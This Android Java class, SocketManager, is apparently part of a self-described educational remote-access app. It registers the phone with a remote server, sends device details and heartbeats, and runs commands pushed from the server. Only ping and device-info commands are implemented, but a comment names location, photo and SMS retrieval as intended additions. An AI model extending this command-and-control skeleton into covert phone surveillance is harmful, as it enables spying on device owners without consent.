package com.remoteaccess.educational.network;

import android.content.Context;
import android.util.Log;
import com.remoteaccess.educational.utils.DeviceInfo;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;
import org.json.JSONException;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class SocketManager {

    private static final String TAG = "SocketManager";
    private Socket socket;
    private Context context;
    private String serverUrl;

    public SocketManager(Context context, String serverUrl) {
        this.context = context;
        this.serverUrl = serverUrl;
    }

    public void connect() {
        try {
            IO.Options options = new IO.Options();
            options.forceNew = true;
            options.reconnection = true;

            socket = IO.socket(serverUrl, options);

            socket.on(Socket.EVENT_CONNECT, onConnect);
            socket.on(Socket.EVENT_DISCONNECT, onDisconnect);
            socket.on(Socket.EVENT_CONNECT_ERROR, onConnectError);
            socket.on("command:execute", onCommandReceived);

            socket.connect();

        } catch (URISyntaxException e) {
            Log.e(TAG, "Socket connection error: " + e.getMessage());
        }
    }

    public void registerDevice(String deviceId) {
        try {
            JSONObject data = new JSONObject();
            data.put("deviceId", deviceId);
            data.put("deviceName", DeviceInfo.getDeviceName());
            data.put("model", DeviceInfo.getModel());
            data.put("androidVersion", DeviceInfo.getAndroidVersion());

            socket.emit("device:register", data);
            Log.d(TAG, "Device registered: " + deviceId);

        } catch (JSONException e) {
            Log.e(TAG, "Error registering device: " + e.getMessage());
        }
    }

    public void sendHeartbeat(String deviceId) {
        try {
            JSONObject data = new JSONObject();
            data.put("deviceId", deviceId);
            socket.emit("device:heartbeat", data);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending heartbeat: " + e.getMessage());
        }
    }

    public void sendResponse(String deviceId, String command, Object result) {
        try {
            JSONObject data = new JSONObject();
            data.put("deviceId", deviceId);
            data.put("command", command);
            data.put("result", result);
            data.put("timestamp", System.currentTimeMillis());

            socket.emit("device:response", data);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending response: " + e.getMessage());
        }
    }

    public void disconnect() {
        if (socket != null) {
            socket.disconnect();
            socket.off();
        }
    }

    // Event Listeners
    private Emitter.Listener onConnect = args -> {
        Log.d(TAG, "Socket connected");
        registerDevice(DeviceInfo.getDeviceId(context));
    };

    private Emitter.Listener onDisconnect = args -> {
        Log.d(TAG, "Socket disconnected");
    };

    private Emitter.Listener onConnectError = args -> {
        Log.e(TAG, "Socket connection error: " + args[0]);
    };

    private Emitter.Listener onCommandReceived = args -> {
        try {
            JSONObject data = (JSONObject) args[0];
            String command = data.getString("command");
            JSONObject params = data.optJSONObject("params");

            Log.d(TAG, "Command received: " + command);

            // Handle commands here
            handleCommand(command, params);

        } catch (JSONException e) {
            Log.e(TAG, "Error parsing command: " + e.getMessage());
        }
    };

    private void handleCommand(String command, JSONObject params) {
        // Implement command handling based on your requirements
        // Examples: get_location, take_photo, get_sms, etc.
        
        String deviceId = DeviceInfo.getDeviceId(context);
        
        switch (command) {
            case "ping":
                sendResponse(deviceId, "ping", "pong");
                break;
            case "get_device_info":
                sendResponse(deviceId, "get_device_info", DeviceInfo.getAllInfo(context));
                break;
            // Add more command handlers as needed
            default:
                Log.w(TAG, "Unknown command: " + command);
        }
    }
}
